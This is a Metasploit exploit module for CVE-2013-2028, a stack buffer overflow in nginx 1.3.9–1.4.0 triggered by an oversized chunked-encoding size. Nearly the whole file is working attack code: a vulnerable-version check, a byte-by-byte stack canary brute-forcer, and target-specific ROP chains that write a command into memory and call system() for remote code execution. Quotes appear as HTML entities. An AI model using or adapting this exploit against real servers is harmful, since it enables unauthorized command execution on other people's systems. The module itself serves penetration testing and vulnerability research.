# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote

  include Exploit::Remote::Tcp

  def initialize(info = {})

    super(update_info(info,
      &#039;Name&#039;           => &#039;Nginx HTTP Server 1.3.9-1.4.0 Chuncked Encoding Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx.
        The exploit first triggers an integer overflow in the ngx_http_parse_chunked() by
        supplying an overly long hex value as chunked block size. This value is later used
        when determining the number of bytes to read into a stack buffer, thus the overflow
        becomes possible.
      },
      &#039;Author&#039;         =>
        [
          &#039;Greg MacManus&#039;,    # original discovery
          &#039;hal&#039;,              # Metasploit module
          &#039;saelo&#039;             # Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;May 07 2013&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2028&#039;],
          [&#039;OSVDB&#039;, &#039;93037&#039;],
          [&#039;URL&#039;, &#039;http://nginx.org/en/security_advisories.html&#039;],
          [&#039;URL&#039;, &#039;http://packetstormsecurity.com/files/121560/Nginx-1.3.9-1.4.0-Stack-Buffer-Overflow.html&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x0d\x0a",
        },
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Ubuntu 13.04 32bit - nginx 1.4.0&#039;, {
            &#039;CanaryOffset&#039; => 5050,
            &#039;Offset&#039; => 12,
            &#039;Writable&#039; => 0x080c7330, # .data from nginx
            :dereference_got_callback => :dereference_got_ubuntu_1304,
            :store_callback => :store_ubuntu_1304,
          }],
          [ &#039;Debian Squeeze 32bit - nginx 1.4.0&#039;, {
            &#039;Offset&#039; => 5130,
            &#039;Writable&#039; => 0x080b4360, # .data from nginx
            :dereference_got_callback => :dereference_got_debian_squeeze,
            :store_callback => :store_debian_squeeze
          } ],
        ],

      &#039;DefaultTarget&#039; => 0
  ))

  register_options([
      OptPort.new(&#039;RPORT&#039;, [true, "The remote HTTP server port", 80])
    ], self.class)

  register_advanced_options(
    [
      OptInt.new("CANARY", [false, "Use this value as stack canary instead of brute forcing it", 0xffffffff ]),
    ], self.class)

  end

  def peer
    "#{rhost}:#{rport}"
  end

  def check
    begin
      res = send_request_fixed(nil)

      if res =~ /^Server: nginx\/(1\.3\.(9|10|11|12|13|14|15|16)|1\.4\.0)/m
        return Exploit::CheckCode::Appears
      elsif res =~ /^Server: nginx/m
        return Exploit::CheckCode::Detected
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end

    return Exploit::CheckCode::Unknown
  end

  #
  # Generate a random chunk size that will always result
  # in a negative 64bit number when being parsed
  #
  def random_chunk_size(bytes=16)
    return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join
  end

  def send_request_fixed(data)

    connect

    request =   "GET / HTTP/1.1\r\n"
    request <<  "Host: #{Rex::Text.rand_text_alpha(16)}\r\n"
    request <<  "Transfer-Encoding: Chunked\r\n"
    request <<  "\r\n"
    request <<  "#{data}"

    sock.put(request)

    res = nil

    begin
      res = sock.get_once(-1, 0.5)
    rescue EOFError => e
      # Ignore
    end

    disconnect
    return res
  end

  def store_ubuntu_1304(address, value)
    chain = [
      0x0804c415, # pop ecx ; add al, 29h ; ret
      address, # address
      0x080b9a38, # pop eax ; ret
      value.unpack(&#039;V&#039;).first, # value
      0x080a9dce, # mov [ecx], eax ; mov [ecx+4], edx ; mov eax, 0 ; ret
    ]
    return chain.pack(&#039;V*&#039;)
  end

  def dereference_got_ubuntu_1304
    chain = [
      0x08094129,         # pop esi; ret
      0x080c5090,         # GOT for localtime_r
      0x0804c415,         # pop ecx ; add al, 29h ; ret
      0x001a4b00,         # Offset to system
      0x080c360a,         # add ecx, [esi] ; adc al, 41h ; ret
      0x08076f63,         # push ecx ; add al, 39h ; ret
      0x41414141,         # Garbage return address
      target[&#039;Writable&#039;], # ptr to .data where contents have been stored
    ]
    return chain.pack(&#039;V*&#039;)
  end

  def store_debian_squeeze(address, value)
    chain = [
      0x08050d93,              # pop edx ; add al 0x83 ; ret
      value.unpack(&#039;V&#039;).first, # value
      0x08067330,              # pop eax ; ret
      address,                 # address
      0x08070e94,              # mov [eax] edx ; mov eax 0x0 ; pop ebp ; ret
      0x41414141,              # ebp
    ]

    return chain.pack(&#039;V*&#039;)
  end

  def dereference_got_debian_squeeze
    chain = [
      0x0804ab34,        # pop edi ; pop ebp ; ret
      0x080B4128 -
      0x5d5b14c4,        # 0x080B4128 => GOT for localtime_r; 0x5d5b14c4 => Adjustment
      0x41414141,      # padding (ebp)
      0x08093c75,        # mov ebx, edi ; dec ecx ; ret
      0x08067330,        # pop eax # ret
      0xfffb0c80,        # offset
      0x08078a46,        # add eax, [ebx+0x5d5b14c4] # ret
      0x0804a3af,         # call eax # system
      target[&#039;Writable&#039;] # ptr to .data where contents have been stored
    ]
    return chain.pack("V*")
  end

  def store(buf, address, value)
    rop = target[&#039;Rop&#039;]
    chain = rop[&#039;store&#039;][&#039;chain&#039;]
    chain[rop[&#039;store&#039;][&#039;address_offset&#039;]] = address
    chain[rop[&#039;store&#039;][&#039;value_offset&#039;]] = value.unpack(&#039;V&#039;).first
    buf << chain.pack(&#039;V*&#039;)
  end

  def dereference_got

    unless self.respond_to?(target[:store_callback]) and self.respond_to?(target[:dereference_got_callback])
      fail_with(Exploit::Failure::NoTarget, "Invalid target specified: no callback functions defined")
    end

    buf = ""
    command = payload.encoded
    i = 0
    while i < command.length
      buf << self.send(target[:store_callback], target[&#039;Writable&#039;] + i, command[i, 4].ljust(4, ";"))
      i = i + 4
    end

    buf << self.send(target[:dereference_got_callback])

    return buf
  end

  def exploit
    data = random_chunk_size(1024)

    if target[&#039;CanaryOffset&#039;].nil?
      data << Rex::Text.rand_text_alpha(target[&#039;Offset&#039;] - data.size)
    else

      if not datastore[&#039;CANARY&#039;] == 0xffffffff
        print_status("#{peer} - Using 0x%08x as stack canary" % datastore[&#039;CANARY&#039;])
        canary = datastore[&#039;CANARY&#039;]
      else
        print_status("#{peer} - Searching for stack canary")
        canary = find_canary

        if canary.nil? || canary == 0x00000000
          fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to find stack canary")
        else
          print_good("#{peer} - Canary found: 0x%08x\n" % canary)
        end
      end

      data <<  Rex::Text.rand_text_alpha(target[&#039;CanaryOffset&#039;] - data.size)
      data <<  [canary].pack(&#039;V&#039;)
      data << Rex::Text.rand_text_hex(target[&#039;Offset&#039;])

    end

    data << dereference_got

    begin
      send_request_fixed(data)
    rescue Errno::ECONNRESET => e
      # Ignore
    end
    handler
  end

  def find_canary
    # First byte of the canary is already known
    canary = "\x00"

    print_status("#{peer} - Assuming byte 0 0x%02x" % 0x00)

    # We are going to bruteforce the next 3 bytes one at a time
    3.times do |c|
      print_status("#{peer} - Bruteforcing byte #{c + 1}")

      0.upto(255) do |i|
        data =   random_chunk_size(1024)
        data <<  Rex::Text.rand_text_alpha(target[&#039;CanaryOffset&#039;] - data.size)
        data <<  canary
        data << i.chr

        unless send_request_fixed(data).nil?
          print_good("#{peer} - Byte #{c + 1} found: 0x%02x" % i)
          canary << i.chr
          break
        end
      end
    end

    if canary == "\x00"
      return nil
    else
      return canary.unpack(&#039;V&#039;).first
    end
  end
end

